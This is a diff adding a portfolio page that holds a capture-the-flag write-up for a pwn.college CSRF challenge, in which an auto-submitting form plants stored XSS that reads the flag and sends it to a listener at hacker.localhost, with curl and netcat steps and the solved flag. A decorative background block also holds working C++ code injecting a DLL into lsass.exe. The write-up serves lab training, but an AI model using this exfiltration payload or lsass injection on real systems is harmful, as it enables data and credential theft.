@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF-5 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="CSRF-5 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>CSRF-5 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧠 Challenge Overview</h2>
+
+<p>In this challenge, we are given a Flask application using a temporary SQLite database. The goal is to exploit a <strong>Cross-Site Request Forgery (CSRF)</strong> vulnerability that tricks the victim (admin bot) into submitting a form containing malicious JavaScript. This script is then executed by the admin’s browser, allowing us to exfiltrate sensitive data (e.g., the flag).</p>
+
+<h2 id="-server-behavior">📜 Server Behavior</h2>
+
+<p>The server has the following key endpoints:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/login</code>: logs in a user and sets a session cookie.</li>
+  <li><code class="language-plaintext highlighter-rouge">/draft</code>: allows creating a post, with optional <code class="language-plaintext highlighter-rouge">publish=on</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">/publish</code>: renders the published post with JavaScript enabled.</li>
+  <li><code class="language-plaintext highlighter-rouge">/victim</code>: simulates the admin visiting the page.</li>
+  <li><code class="language-plaintext highlighter-rouge">/</code>: homepage, includes the flag in source.</li>
+</ul>
+
+<h2 id="-objective">🎯 Objective</h2>
+
+<p>Make the admin visit a malicious page that submits a CSRF form to <code class="language-plaintext highlighter-rouge">/draft</code> with a payload that publishes a post containing XSS JavaScript. This JavaScript grabs the flag from <code class="language-plaintext highlighter-rouge">/</code> and sends it to our server.</p>
+
+<hr />
+
+<h2 id="-attack-strategy">💣 Attack Strategy</h2>
+
+<ol>
+  <li>Host a malicious HTML page.</li>
+  <li>The page auto-submits a CSRF form to <code class="language-plaintext highlighter-rouge">/draft</code> with <code class="language-plaintext highlighter-rouge">content</code> containing a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.</li>
+  <li>The script:
+    <ul>
+      <li>Fetches the homepage (<code class="language-plaintext highlighter-rouge">/</code>)</li>
+      <li>Extracts the flag using regex</li>
+      <li>Sends the flag to our server via query string</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="️-attack-html-payload">🛠️ Attack HTML (Payload)</h2>
+
+<p>Save this as <code class="language-plaintext highlighter-rouge">index.html</code>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"csrf"</span> <span class="na">action=</span><span class="s">"http://challenge.localhost:80/draft"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"content"</span> <span class="na">value=</span><span class="s">'&lt;script&gt;
+        fetch("/") 
+          .then(r =&gt; r.text())
+          .then(t =&gt; {
+            let flag = t.match(/pwn\.college\{.*?\}/);
+            if (flag) {
+              fetch("http://hacker.localhost:1338/?" + btoa(flag[0]));
+            }
+          });
+      &lt;/script&gt;'</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"publish"</span> <span class="na">value=</span><span class="s">"on"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+    <span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span><span class="nt">&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<h3 id="hosting-the-payload">Hosting the Payload</h3>
+<p>Host the file on port 1337:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 1337
+</code></pre></div></div>
+<h3 id="get-session-cookie-as-hacker">Get Session Cookie (as hacker)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-X</span> POST http://challenge.localhost/login <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s2">"username=hacker&amp;password=1337"</span> <span class="se">\</span>
+  <span class="nt">-c</span> cookie.txt
+</code></pre></div></div>
+<p>Extract the session cookie from response headers:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.&lt;sig&gt;
+</code></pre></div></div>
+
+<h3 id="post-the-payload">Post the Payload</h3>
+<p>Submit the draft using the session cookie:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://challenge.localhost/draft <span class="se">\</span>
+  <span class="nt">-b</span> <span class="s2">"session=&lt;your_cookie&gt;"</span> <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s2">"content=&lt;script&gt;...flag steal script...&lt;/script&gt;&amp;publish=on"</span>
+</code></pre></div></div>
+
+<h3 id="trigger-the-admin-visit">Trigger the Admin Visit</h3>
+<p>Simulate the admin visiting the attacker’s page:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://challenge.localhost/victim
+</code></pre></div></div>
+<p>This will load your http://hacker.localhost:1337/ page, triggering the auto-submit CSRF.</p>
+
+<h3 id="catch-the-flag">Catch the Flag</h3>
+<p>Run a listener to capture exfiltrated data:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 1338
+</code></pre></div></div>
+<p>You will see:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?cHduLmNvbGxlZ2V7WmZZYnpFT0pOeFlYdEt6dEpBTXdFS1RkeVZTSHZMRW1Oek5MeU93MHpNdXJqTzBZMHl9 HTTP/1.1
+</code></pre></div></div>
+<p>Decode the base64:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'cHduLmNvbGxlZ2V7WmZZYnpFT0pOeFlYdEt6dEpBTXdFS1RkeVZTSHZMRW1Oek5MeU93MHpNdXJqTzBZMHl9'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>ZfYbzEOJNyXYtKztJAMwEKTdyVSHvLEmNzNLyOw0zMurjO0Y0y<span class="o">}</span>
+</code></pre></div></div>
+<hr />
+<h2 id="final-flag">Final Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{ZfYbzEOJNyXYtKztJAMwEKTdyVSHvLEmNzNLyOw0zMurjO0Y0y}
+</code></pre></div></div>
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
